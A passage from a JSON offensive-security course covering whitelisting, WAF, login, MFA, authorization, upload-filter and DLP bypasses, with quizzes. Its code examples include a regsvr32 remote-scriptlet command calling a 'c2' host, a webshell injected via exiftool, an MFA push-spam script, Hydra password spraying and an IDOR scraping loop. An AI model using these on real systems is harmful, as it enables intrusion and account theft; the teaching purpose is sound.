                            "To crash the EDR."
                        ],
                        "correct": 1,
                        "explanation": "This technique is a bypass, not a removal. It completely avoids the hooked functions, making the attacker's actions invisible to the EDR's user-land sensor."
                    },
                    {
                        "id": 3,
                        "question": "What is the purpose of a tool like SysWhispers2?",
                        "options": [
                            "It is an EDR.",
                            "It is a C2 framework.",
                            "It automatically generates the C and assembly code needed to make direct system calls, making the bypass technique easier to implement.",
                            "It is a vulnerability scanner."
                        ],
                        "correct": 2,
                        "explanation": "SysWhispers2 is an evasion tool. It automates the complex and version-dependent parts of making direct system calls, lowering the barrier to entry for developers to use this powerful EDR bypass technique."
                    }
                ]
            }
        },
        {
            "id": "lesson-13",
            "title": "Bypassing Application Whitelisting",
            "duration": "75 min",
            "objectives": [
                "Understand the principle of application whitelisting (AppLocker, WDAC)",
                "Learn the 'Living Off the Land' philosophy for bypassing whitelisting",
                "Explore how to abuse trusted, signed scripts and binaries (LOLBins)",
                "Use a LOLBin like regsvr32.exe to execute unsigned code"
            ],
            "content": {
                "overview": "Application whitelisting is one of the most effective preventive security controls. It works on a 'default-deny' principle, blocking everything from running except for a list of known, trusted applications. This lesson covers the primary method for bypassing this powerful defense: Living Off the Land.",
                "sections": [
                    {
                        "title": "How Application Whitelisting Works",
                        "content": "<p>An application whitelisting solution, like Windows AppLocker or WDAC, enforces rules about what code is allowed to execute on a system. Rules can be based on:</p><ul><li><strong>Path:</strong> Allow anything in the `C:\\Windows` directory to run.</li><li><strong>File Hash:</strong> Allow this specific `program.exe` (with this hash) to run.</li><li><strong>Publisher:</strong> Allow any executable that is digitally signed by 'Microsoft Corporation' to run.</li></ul><p>This is a very strong defense because it completely prevents an attacker from simply running their own `malware.exe` on the system.</p>",
                        "image": "https://i.imgur.com/F0f5d8g.png"
                    },
                    {
                        "title": "Living Off the Land Binaries (LOLBins)",
                        "content": "<p>The bypass strategy is not to try and run a new, untrusted executable. The strategy is to abuse the trusted executables that are *already on the whitelist*. These are called <strong>LOLBins (Living Off the Land Binaries)</strong> or LOLBAS (Binaries and Scripts).</p><p>Windows is full of legitimate, Microsoft-signed command-line tools and scripts that are intended for administrators. However, many of these can be abused to perform malicious actions, like downloading files, executing code, or running scripts. Since these are trusted Microsoft binaries, the whitelisting solution will allow them to run.</p>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "The LOLBAS Project",
                        "content": "<p>The <strong>LOLBAS (Living Off the Land Binaries, Scripts, and Libraries)</strong> project is a massive, community-curated list of all the built-in Windows binaries that can be abused by attackers.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Example LOLBin: regsvr32.exe</strong></div><p>The `regsvr32.exe` binary is a legitimate tool for registering DLLs. However, it can also be used to run a remote script. An attacker can host a malicious scriptlet (`.sct` file) on their web server. They can then use `regsvr32.exe` to execute that script on the victim machine. The whitelisting solution sees the trusted `regsvr32.exe` running and allows it, but it is being used to launch the attacker's payload. This is a classic whitelisting bypass.</p></div>",
                        "image": "https://i.imgur.com/kYq3Q6k.png"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "regsvr32 /s /n /u /i:http://c2/payload.sct scrobj.dll",
                    "language": "batch",
                    "code": ":: This command uses a LOLBin, regsvr32.exe, to bypass application whitelisting.\n\n:: regsvr32.exe : The legitimate, Microsoft-signed binary.\n:: /s : Silent mode.\n:: /n /u : Tell regsvr32 not to call the standard installation functions.\n:: /i:http://c2/payload.sct : The magic part. This tells regsvr32 to fetch and execute a scriptlet file from a remote URL.\n:: scrobj.dll : A required argument for this technique.\n\n:: An attacker would host a malicious .sct file on their C2 server.\n:: When this command is run on the victim, the trusted regsvr32 process will download\n:: and execute the attacker's script, bypassing the whitelist."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the core principle of application whitelisting?",
                        "options": [
                            "A 'default-allow' model, where everything can run except for known bad programs.",
                            "A 'default-deny' model, where nothing can run except for known, trusted programs.",
                            "A model based on user behavior.",
                            "A model that scans for viruses."
                        ],
                        "correct": 1,
                        "explanation": "Application whitelisting is a very strong preventive control because it operates on a 'default-deny' basis, which significantly reduces the attack surface."
                    },
                    {
                        "id": 2,
                        "question": "What is a 'LOLBin'?",
                        "options": [
                            "A type of malware.",
                            "A legitimate, signed system binary (like PowerShell or regsvr32.exe) that can be abused by an attacker to perform malicious actions.",
                            "A security product.",
                            "A file format."
                        ],
                        "correct": 1,
                        "explanation": "Living Off the Land Binaries are the primary method for bypassing application whitelisting. The attacker doesn't bring their own untrusted tools; they abuse the trusted ones already on the system."
                    },
                    {
                        "id": 3,
                        "question": "Why is the 'Living Off the Land' technique an effective bypass for application whitelisting?",
                        "options": [
                            "Because it is very fast.",
                            "Because the attacker is using trusted, signed Microsoft binaries that are allowed to run by the whitelisting policy.",
                            "Because it is a new technique.",
                            "Because it does not generate any logs."
                        ],
                        "correct": 1,
                        "explanation": "The attack works by abusing trust. The whitelisting solution sees a legitimate program like `powershell.exe` and allows it, but the attacker is using that legitimate program for a malicious purpose."
                    }
                ]
            }
        },
        {
            "id": "lesson-14",
            "title": "Bypassing Web Application Firewalls (WAFs)",
            "duration": "75 min",
            "objectives": [
                "Understand how WAFs use signature-based rules to inspect HTTP traffic",
                "Learn common WAF bypass techniques for SQL Injection and XSS",
                "Explore the use of encoding (URL, Base64) and case variations",
                "Analyze how to use tamper scripts in tools like sqlmap to automate bypasses"
            ],
            "content": {
                "overview": "A Web Application Firewall (WAF) is a specialized firewall that sits in front of a web application and inspects HTTP traffic to block common attacks like SQL Injection and Cross-Site Scripting (XSS). This lesson covers the common techniques used to obfuscate attack payloads to bypass these signature-based WAF rules.",
                "sections": [
                    {
                        "title": "How WAFs Work",
                        "content": "<p>A WAF is essentially a signature-based IDS/IPS for web traffic. It has a set of rules that look for known malicious patterns in HTTP requests.</p><h3>Example SQL Injection Rule:</h3><p>A simple WAF rule might look for the string `' OR 1=1 --` in any request parameter. If it sees this classic SQL injection payload, it will block the request.</p><p>The goal of the attacker is to find a way to send a functionally equivalent payload that does not match this exact signature.</p>",
                        "image": "https://i.imgur.com/u7y7o9o.png"
                    },
                    {
                        "title": "WAF Evasion Techniques",
                        "content": "<p>Attackers use a variety of encoding and obfuscation techniques to change the signature of their payload.</p><ul><li><strong>Case Variation:</strong> A simple WAF might only look for `' or 1=1`. An attacker could bypass this with `' oR 1=1`.</li><li><strong>Encoding:</strong> The attacker could URL-encode or hex-encode parts of their payload. The web server will decode this back to the original payload, but the WAF might fail to.</li><li><strong>Comments and Null Bytes:</strong> An attacker might insert comments (e.g., `/*comment*/`) or null bytes (`%00`) into their payload to break up the signature that the WAF is looking for.</li><li><strong>HTTP Parameter Pollution:</strong> An attacker might split their payload across multiple HTTP parameters with the same name. The WAF might only inspect the first one, while the back-end application might concatenate them, reassembling the full payload.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Automating Bypasses with Tamper Scripts",
                        "content": "<p>Tools like <strong>sqlmap</strong> (for SQL injection) come with a large library of <strong>tamper scripts</strong>. Each tamper script is a small program that implements a specific WAF bypass technique.</p><div class='info-box tip'><div class='info-box-header'><i class='fas fa-lightbulb'></i><strong>Trying All the Tricks</strong></div><p>An operator can tell sqlmap to try a specific tamper script, or to try all of them. For each payload it generates, sqlmap will pass it through the tamper script to obfuscate it before sending it to the target. This automates the tedious process of manually trying hundreds of different encoding and obfuscation variations.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "sqlmap -u \"url\" --tamper=space2comment",
                    "language": "bash",
                    "code": "# sqlmap is the leading open-source tool for automating SQL injection attacks.\n\n# -u \"http://testsite.com/page.php?id=1\" : The target URL.\n# --tamper=space2comment : Use a specific tamper script. This one replaces spaces\n#                          in the payload with comments (e.g., ' ' becomes '/**/').\n\n# Original Payload sqlmap might try: '1 UNION SELECT 1,2,3'\n# The WAF might have a signature for 'UNION SELECT'.\n\n# Tampered Payload that gets sent:\n# '1/**/UNION/**/SELECT/**/1,2,3'\n\n# The database will still execute this correctly, but the modified payload may bypass\n# the WAF's simple string-matching rule."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary function of a Web Application Firewall (WAF)?",
                        "options": [
                            "To host a web application.",
                            "To inspect HTTP traffic and block requests that match the signatures of known web attacks like SQL Injection.",
                            "To manage user authentication.",
                            "To act as a load balancer."
                        ],
                        "correct": 1,
                        "explanation": "A WAF is a specialized, preventive control that is designed to protect web applications from common, known attack patterns."
                    },
                    {
                        "id": 2,
                        "question": "Changing an SQL injection payload from `union select` to `uNiOn sElEcT` is an example of which WAF bypass technique?",
                        "options": [
                            "Encoding",
                            "Case variation",
                            "HTTP Parameter Pollution",
                            "Fragmentation"
                        ],
                        "correct": 1,
                        "explanation": "This is a simple but sometimes effective technique to defeat a WAF that is only looking for an exact, case-sensitive string match."
                    },
                    {
                        "id": 3,
                        "question": "What is the purpose of a 'tamper script' in a tool like sqlmap?",
                        "options": [
                            "To make the attack slower.",
                            "To automatically apply various obfuscation and encoding techniques to a payload to try and bypass a WAF.",
                            "To write the final report.",
                            "To find the target's IP address."
                        ],
                        "correct": 1,
                        "explanation": "Tamper scripts are the automation engine for WAF bypasses. They systematically try dozens of different known bypass techniques, saving the operator a huge amount of manual effort."
                    }
                ]
            }
        },
        {
            "id": "lesson-15",
            "title": "Bypassing Authentication Mechanisms",
            "duration": "75 min",
            "objectives": [
                "Understand common authentication weaknesses",
                "Learn how to perform password spraying and brute-force attacks",
                "Explore techniques for exploiting insecure password reset functions",
                "Analyze session management flaws like predictable session IDs",
                "Practice a brute-force attack on a login form with Hydra"
            ],
            "content": {
                "overview": "Authentication is the front door to an application. This lesson covers the common techniques used to bypass this critical control, from guessing weak passwords to exploiting flaws in how the application manages user sessions.",
                "sections": [
                    {
                        "title": "Password Spraying and Brute-Forcing",
                        "content": "<p>These are the two primary attacks against password-based logins.</p><ul><li><strong>Brute-Force Attack:</strong> The attacker takes a single username and tries thousands of different passwords against it. This is noisy and likely to lock out the account.</li><li><strong>Password Spraying:</strong> A much stealthier and more effective technique. The attacker takes a single, common password (e.g., 'Winter2024') and tries it against *hundreds or thousands* of different usernames. Because they are only trying one password per user, it is unlikely to trigger account lockout policies. This is extremely effective in organizations that have weak password policies.</li></ul>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Insecure Password Resets",
                        "content": "<p>The 'Forgot Password' functionality is a common source of vulnerabilities. An attacker can analyze this process to look for weaknesses.</p><h3>Common Flaws:</h3><ul><li><strong>Weak Security Questions:</strong> The answers to questions like 'What was your first pet's name?' can often be found through OSINT.</li><li><strong>Predictable Reset Tokens:</strong> If the token sent to the user's email is a short, predictable number, an attacker could try to brute-force it.</li><li><strong>Host Header Injection:</strong> The password reset link might be generated using the HTTP `Host` header. An attacker can manipulate this header to generate a reset link that sends the token to the attacker's server instead of the user's.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Session Management Flaws",
                        "content": "<p>After a user logs in, they are given a session cookie that keeps them authenticated. The security of this cookie is critical.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>Predictable Cookies</strong></div><p>If the session cookie is not a long, cryptographically random value, an attacker might be able to guess it. For example, if the session ID is just a simple number that increments for each new user (e.g., user 1 gets ID 1000, user 2 gets ID 1001), an attacker could simply change their own cookie to 1002, 1003, etc., to hijack other users' sessions. This is a classic vulnerability in poorly designed web applications.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "hydra -l user -P /path/to/wordlist.txt <target_ip> http-post-form",
                    "language": "bash",
                    "code": "# THC-Hydra is a popular, fast, and flexible tool for online password cracking.\n\n# -l jsmith : The single username to target (for a brute-force attack).\n# -L users.txt : A list of usernames (for a password spraying attack).\n# -P /path/to/passwords.txt : A list of passwords to try.\n# <target_ip> : The target server.\n# http-post-form : The protocol module to use.\n\n# A password spraying example:\n# Try one common password against a list of users.\nhydra -L users.txt -p 'Winter2024!' 10.10.10.10 http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=Login Failed\""
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the key difference between a brute-force attack and a password spraying attack?",
                        "options": [
                            "There is no difference.",
                            "A brute-force attack tries many passwords for one user, while a password spraying attack tries one password for many users.",
                            "Password spraying is noisier.",
                            "Brute-force attacks are always more effective."
                        ],
                        "correct": 1,
                        "explanation": "Password spraying is a much stealthier technique. By trying only one or two passwords per user, it is far less likely to trigger account lockout policies, making it a highly effective technique in environments with weak password policies."
                    },
                    {
                        "id": 2,
                        "question": "What is the primary risk of a predictable session ID?",
                        "options": [
                            "It makes the application run slower.",
                            "An attacker could guess or predict the session IDs of other users, allowing them to hijack their authenticated sessions.",
                            "It makes the session cookie larger.",
                            "It is not a risk."
                        ],
                        "correct": 1,
                        "explanation": "Session IDs must be long, random, and unpredictable. Anything less allows an attacker to bypass the login process entirely by simply guessing a valid session identifier."
                    },
                    {
                        "id": 3,
                        "question": "Which of the following is a potential vulnerability in a password reset mechanism?",
                        "options": [
                            "Requiring the user's old password.",
                            "Using a long, random, single-use reset token.",
                            "Using a security question whose answer is easily discoverable through public sources (OSINT).",
                            "Sending the reset link to the user's registered email address."
                        ],
                        "correct": 2,
                        "explanation": "Weak security questions are a common flaw. If the answer to 'What city were you born in?' is on a user's public social media profile, the password reset function becomes a security vulnerability."
                    }
                ]
            }
        },
        
        {
            "id": "lesson-16",
            "title": "Bypassing Multi-Factor Authentication (MFA)",
            "duration": "75 min",
            "objectives": [
                "Understand the different factors of authentication (Something You Know, Have, Are)",
                "Analyze techniques for bypassing MFA, including push fatigue and SIM swapping",
                "Explore how to steal session cookies to bypass MFA post-authentication",
                "Set up a phishing campaign to steal session cookies with Evilginx2"
            ],
            "content": {
                "overview": "Multi-Factor Authentication (MFA) is a critical security control, but it is not infallible. This lesson covers the advanced techniques that attackers use to bypass MFA, from social engineering attacks that trick the user into approving a login, to technical attacks that steal the session cookie after the user has already authenticated.",
                "sections": [
                    {
                        "title": "MFA Push Fatigue",
                        "content": "<p>Many MFA systems use a push notification to a user's mobile app. The user simply taps 'Approve' to complete the login. An attacker who has already stolen a user's password can abuse this system with a <strong>push fatigue</strong> or 'MFA spam' attack.</p><p>The attacker will repeatedly trigger login attempts, sometimes dozens or hundreds of times, often in the middle of the night. Each attempt sends another push notification to the user's phone. The goal is that the user will eventually get annoyed or confused and accidentally hit 'Approve' just to make the notifications stop. This is a purely psychological attack that bypasses the technical control.</p>",
                        "image": "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "SIM Swapping",
                        "content": "<p>If an MFA system uses SMS-based codes, it is vulnerable to a <strong>SIM swapping</strong> attack. This is a sophisticated social engineering attack where the attacker contacts the victim's mobile phone provider. They impersonate the victim and convince the customer service representative to transfer the victim's phone number to a SIM card controlled by the attacker.</p><p>Once the swap is complete, all of the victim's calls and text messages, including MFA codes, will be sent to the attacker's phone. The attacker can then use this to complete the login and reset the password on the account.</p>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    },
                    {
                        "title": "Session Cookie Theft",
                        "content": "<p>The most powerful technical bypass for MFA is to not attack the MFA process itself, but to steal the <strong>session cookie</strong> *after* the user has successfully authenticated.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>Adversary-in-the-Middle (AiTM)</strong></div><p>Tools like <strong>Evilginx2</strong> are used to perform an Adversary-in-the-Middle (AiTM) phishing attack. The attacker sets up a phishing page that acts as a reverse proxy to the real login page. The victim visits the phishing site, enters their username and password, which are passed to the real site. The real site then challenges for MFA. The victim enters their MFA code on the phishing site, which is passed to the real site. The real site validates the MFA and sends back a session cookie. Evilginx2 intercepts this cookie and gives it to the attacker. The attacker can now use this cookie to access the application directly, completely bypassing the need for MFA.</p></div>",
                        "image": "https://i.imgur.com/kYq3Q6k.png"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Simulate_MFA_Push_Fatigue_Script.py",
                    "language": "python",
                    "code": "import requests\nimport time\n\n# This script simulates an MFA push fatigue attack.\n# It requires a stolen username and password.\n\nLOGIN_URL = \"https://login.target.com/\"\nUSERNAME = \"victim@target.com\"\nPASSWORD = \"StolenPassword123\"\n\nprint(f\"Starting MFA push spam against {USERNAME}...\")\n\nfor i in range(1, 101):\n    try:\n        # This POST request submits the credentials.\n        # The server will then send a push notification to the real user.\n        requests.post(LOGIN_URL, data={'user': USERNAME, 'pass': PASSWORD})\n        print(f\"Sent push notification #{i}\")\n        # Wait a few seconds before sending the next one.\n        time.sleep(5)\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n\nprint(\"Attack complete.\")"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is an MFA push fatigue attack?",
                        "options": [
                            "A hardware attack on a user's phone.",
                            "A social engineering attack where an attacker who has a password spams a user with push notifications, hoping they will accidentally approve one.",
                            "A method for stealing a user's password.",
                            "A type of malware."
                        ],
                        "correct": 1,
                        "explanation": "This attack bypasses the technical security of MFA by targeting the human. It exploits a user's annoyance and desire to make the notifications stop to trick them into making a security mistake."
                    },
                    {
                        "id": 2,
                        "question": "What is the goal of an Adversary-in-the-Middle (AiTM) phishing attack using a tool like Evilginx2?",
                        "options": [
                            "To steal the user's password.",
                            "To steal the user's session cookie after they have successfully completed the MFA process.",
                            "To lock the user's account.",
                            "To send spam email."
                        ],
                        "correct": 1,
                        "explanation": "This is a powerful technique because it bypasses MFA entirely. By stealing the session cookie, the attacker gains access to the authenticated session without ever needing to deal with the MFA factor themselves."
                    },
                    {
                        "id": 3,
                        "question": "Which type of MFA factor is vulnerable to a SIM swapping attack?",
                        "options": [
                            "A FIDO2/WebAuthn security key.",
                            "An authenticator app like Google Authenticator.",
                            "SMS-based one-time passcodes.",
                            "Biometrics."
                        ],
                        "correct": 2,
                        "explanation": "SMS-based MFA is considered the weakest form of MFA precisely because it is vulnerable to attacks like SIM swapping that are outside the user's control. Security keys and authenticator apps are much more secure."
                    }
                ]
            }
        },
        {
            "id": "lesson-17",
            "title": "Bypassing Authorization Controls",
            "duration": "75 min",
            "objectives": [
                "Understand the difference between authentication and authorization",
                "Learn how to test for Insecure Direct Object References (IDOR)",
                "Explore techniques for Path Traversal to access unauthorized files",
                "Analyze how to escalate privileges within an application",
                "Practice manually testing a web app for IDOR vulnerabilities"
            ],
            "content": {
                "overview": "Authentication confirms you are who you say you are. Authorization determines what you are allowed to do. This lesson covers attacks that bypass authorization controls, allowing an authenticated but low-privilege user to access data or perform actions that should be restricted to other users or administrators.",
                "sections": [
                    {
                        "title": "Insecure Direct Object References (IDOR)",
                        "content": "<p><strong>IDOR</strong> is a very common and often critical vulnerability. It occurs when an application provides direct access to objects based on user-supplied input. An attacker can manipulate this input to access resources belonging to other users.</p><h3>Example:</h3><p>A user logs into a web application and goes to their profile page. The URL is <code>https://app.com/profile?user_id=123</code>. The application correctly checked their password, but it might not be checking if the logged-in user is actually user #123.</p><p>An attacker can simply change the URL to <code>https://app.com/profile?user_id=124</code>. If the application is vulnerable, it will display the profile and sensitive information for user #124, even though the attacker is logged in as user #123. This is a failure of authorization.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Path Traversal",
                        "content": "<p>A <strong>Path Traversal</strong> (or Directory Traversal) vulnerability allows an attacker to access files on the web server that are outside of the intended web root directory. This happens when the application uses user-supplied input to construct a file path without properly sanitizing it.</p><h3>Example:</h3><p>An application retrieves a user's profile picture with the URL <code>https://app.com/show_image?file=user.jpg</code>. The code on the server might be doing `readfile('/var/www/images/' + filename)`. An attacker can manipulate the `file` parameter with the `../` sequence to 'traverse' up the directory tree.</p><p>An attacker could send a request like `?file=../../../../etc/passwd`. The server would concatenate this to `/var/www/images/../../../../etc/passwd`, which resolves to `/etc/passwd`, and the application would return the system's password file to the attacker.</p>",
                        "image": "https://images.unsplash.com/photo-1599508704512-2f19efd1e_35f?w=800&h=400&fit=crop"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "curl \"http://app/user-profile?id=101\"",
                        "language": "bash",
                        "code": "# This demonstrates a manual test for an IDOR vulnerability.\n\n# 1. Log in as a normal user and navigate to a page that uses an ID.\n#    Let's say our user ID is 101.\ncurl -b 'session=...valid_cookie...' \"http://app.com/view_invoice?id=101\"\n# > (Returns our own invoice)\n\n# 2. Now, simply change the ID parameter to a different number.\ncurl -b 'session=...valid_cookie...' \"http://app.com/view_invoice?id=102\"\n# > (If it returns the invoice for user 102, an IDOR vulnerability exists!)\n\n# 3. An attacker can write a simple script to iterate through thousands of IDs\n#    and download all the data.\nfor i in {1..1000}; do\n  curl -b 'session=...valid_cookie...' \"http://app.com/view_invoice?id=$i\" -o \"invoice_$i.html\"\ndone"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the difference between authentication and authorization?",
                        "options": [
                            "They are the same thing.",
                            "Authentication is proving your identity; authorization is determining what you are allowed to do.",
                            "Authorization happens before authentication.",
                            "Authentication is only for administrators."
                        ],
                        "correct": 1,
                        "explanation": "This is a fundamental security concept. Authentication is the login page. Authorization is what happens after you log in, checking your permissions for every action you take."
                    },
                    {
                        "id": 2,
                        "question": "An attacker changing `?user_id=500` to `?user_id=501` in a URL to view another user's data is an example of what vulnerability?",
                        "options": [
                            "SQL Injection",
                            "Cross-Site Scripting (XSS)",
                            "Insecure Direct Object Reference (IDOR)",
                            "A firewall misconfiguration."
                        ],
                        "correct": 2,
                        "explanation": "IDOR is a failure to check authorization. The application correctly authenticated the user, but it failed to check if that authenticated user was *authorized* to view the requested object (user_id=501)."
                    },
                    {
                        "id": 3,
                        "question": "What is the purpose of the `../` sequence in a Path Traversal attack?",
                        "options": [
                            "It is a comment.",
                            "It is used to move up one level in the file system's directory structure.",
                            "It is used to specify a different protocol.",
                            "It is a type of encoding."
                        ],
                        "correct": 1,
                        "explanation": "The `..` is a standard directory command that means 'parent directory'. By chaining these together (`../../`), an attacker can 'escape' from the web root directory and access sensitive system files."
                    }
                ]
            }
        },
        {
            "id": "lesson-18",
            "title": "Bypassing File Upload Filters",
            "duration": "75 min",
            "objectives": [
                "Understand the security risks of file upload functionality",
                "Learn how to evade filters that restrict file types and content",
                "Explore techniques like changing Content-Type headers and using double extensions",
                "Analyze how to embed a payload in a valid image file's metadata",
                "Practice uploading a webshell by bypassing a simple filter"
            ],
            "content": {
                "overview": "File upload functionality is a notoriously dangerous feature in web applications. If not properly secured, it can provide a direct path for an attacker to upload and execute a webshell, giving them full control of the server. This lesson covers the common techniques used to bypass file upload filters.",
                "sections": [
                    {
                        "title": "Bypassing File Type Filters",
                        "content": "<p>A common defense is to check the file extension. For example, a filter might only allow `.jpg` and `.png` files and block `.php`. There are several ways to bypass this:</p><ul><li><strong>Double Extensions:</strong> An attacker might name their file `shell.php.jpg`. If the application is poorly configured (e.g., on an older Apache server), it might be tricked into executing the file as PHP.</li><li><strong>Case Variations:</strong> A simple filter might block `.php` but not `.pHp` or `.php5`.</li><li><strong>Null Byte Injection:</strong> In older, C-based languages, an attacker could upload a file named `shell.php%00.jpg`. The file check would see the `.jpg`, but the operating system would stop reading the string at the null byte (`%00`) and save the file as `shell.php`.</li></ul>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Bypassing Content-Type Filters",
                        "content": "<p>A more robust defense is to check the file's `Content-Type` header, which is sent by the browser. For example, a JPEG image will have a `Content-Type` of `image/jpeg`. An attacker can easily bypass this by intercepting their request with a proxy (like Burp Suite) and simply changing the `Content-Type` of their PHP webshell from `application/x-httpd-php` to `image/jpeg`. The server will now think it's a legitimate image.</p>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Bypassing Content Validation",
                        "content": "<p>The strongest defense is to validate the actual content of the file. For an image, the server might use a function like `getimagesize` to verify that it's a real image. This can be bypassed by creating a <strong>polyglot</strong> file.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Polyglot Files</strong></div><p>An attacker can take a real, valid image file and inject their PHP webshell code into the file's metadata (e.g., the EXIF Comment field). The file is now a valid image *and* a valid PHP script. It will pass the `getimagesize` check, but if the attacker can find a way to make the server execute it (e.g., via another vulnerability like a Local File Inclusion), the webshell code will run.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "exiftool -Comment=\"<?php echo system(\$_GET['cmd']);?>\" image.jpg",
                    "language": "bash",
                    "code": "# ExifTool is a command-line tool for reading and writing file metadata.\n# This command injects a simple PHP webshell into the 'Comment' field of an image's EXIF data.\n\n# -Comment=... : The metadata field to write to.\n# \"<?php ... ?>\" : The PHP webshell code. It will execute any command passed in the 'cmd' GET parameter.\n# image.jpg : The target image file.\n\nexiftool -Comment=\"<?php echo system(\\\$_GET['cmd']);?>\" image.jpg\n\n# The resulting 'image.jpg' is still a perfectly valid image that can be viewed.\n# However, if an attacker can get a web server to interpret this JPG file as PHP,\n# they can execute commands by navigating to:\n# http://site.com/uploads/image.jpg?cmd=whoami"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary goal of an attacker who has found a vulnerable file upload function?",
                        "options": [
                            "To upload a very large file to crash the server.",
                            "To upload a webshell to gain remote code execution on the server.",
                            "To upload their personal photos.",
                            "To test the server's upload speed."
                        ],
                        "correct": 1,
                        "explanation": "A webshell is a script that provides a command and control interface over HTTP. Successfully uploading one is often equivalent to a full server compromise."
                    },
                    {
                        "id": 2,
                        "question": "How can an attacker bypass a server-side filter that only checks the `Content-Type` header?",
                        "options": [
                            "They cannot bypass it.",
                            "By renaming the file.",
                            "By intercepting the request and changing the `Content-Type` header to a whitelisted value (e.g., `image/jpeg`).",
                            "By compressing the file."
                        ],
                        "correct": 2,
                        "explanation": "The `Content-Type` header is client-controlled, which means it cannot be trusted for security decisions. An attacker can set this header to any value they want using a simple proxy tool."
                    },
                    {
                        "id": 3,
                        "question": "What is a 'polyglot' file in the context of a file upload bypass?",
                        "options": [
                            "A file that is written in multiple languages.",
                            "A file that is a valid file of multiple different types simultaneously (e.g., both a valid JPG and a valid PHP script).",
                            "A file that is very large.",
                            "A file that is encrypted."
                        ],
                        "correct": 1,
                        "explanation": "Polyglots are a powerful bypass technique. By crafting a file that is a valid image, it can pass the server's content validation checks, but because it also contains valid script code, it can be executed if the attacker finds another way to make the server interpret it as such."
                    }
                ]
            }
        },
        {
            "id": "lesson-19",
            "title": "Bypassing Data Loss Prevention (DLP)",
            "duration": "75 min",
            "objectives": [
                "Understand how Data Loss Prevention (DLP) systems work",
                "Learn how to evade content-based detection using encryption and archives",
                "Explore evasion through OCR and steganography",
                "Analyze the use of covert channels for data exfiltration",
                "Practice using a DNS tunneling tool"
            ],
            "content": {
                "overview": "Data Loss Prevention (DLP) systems are designed to be the last line of defense, preventing sensitive data from leaving the corporate network. This lesson covers the techniques that attackers use to bypass these controls, from simple encryption to hiding data in plain sight with covert channels.",
                "sections": [
                    {
                        "title": "How DLP Systems Work",
                        "content": "<p>A DLP solution is a detective and preventive control that inspects outbound network traffic (e.g., emails, web uploads) to look for sensitive data. It can be configured to block the transfer or simply alert the security team.</p><h3>Detection Methods:</h3><ul><li><strong>Regex/Keyword Matching:</strong> Looking for specific patterns, like Social Security Numbers (`\\d{3}-\\d{2}-\\d{4}`) or the keyword 'Project Kronos Confidential'.</li><li><strong>File Hashing:</strong> Maintaining a database of hashes of known sensitive documents.</li><li><strong>Statistical Analysis:</strong> Identifying documents that are statistically similar to a known sensitive document.</li></ul>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    },
                    {
                        "title": "Evasion Techniques",
                        "content": "<p>An attacker can use a variety of techniques to bypass these checks.</p><ul><li><strong>Encryption:</strong> The most effective method. If an attacker puts the stolen data into a password-protected ZIP or RAR archive, a DLP system that cannot inspect encrypted archives will be completely blind to the content.</li><li><strong>OCR Evasion:</strong> An attacker can take a sensitive document, convert it to an image (a screenshot), and then embed that image in a different document. A simple DLP that only performs text analysis will not be able to read the text inside the image.</li><li><strong>Steganography:</strong> The practice of hiding data within another file, such as concealing a secret text document inside the pixels of an image file.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Covert Channels",
                        "content": "<p>As discussed in the firewall lesson, a <strong>covert channel</strong> is the ultimate DLP bypass. Instead of trying to exfiltrate the data in a single, large chunk, the attacker breaks it into many tiny pieces and exfiltrates it over a protocol that is not designed for data transfer, like DNS or ICMP. A DLP system is unlikely to be monitoring these protocols for large-scale data exfiltration.</p>",
                        "image": "https://images.unsplash.com/photo-1544383835-bda2bc66a22d?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Steganography_Payload_in_Image_PoC.py",
                    "language": "python",
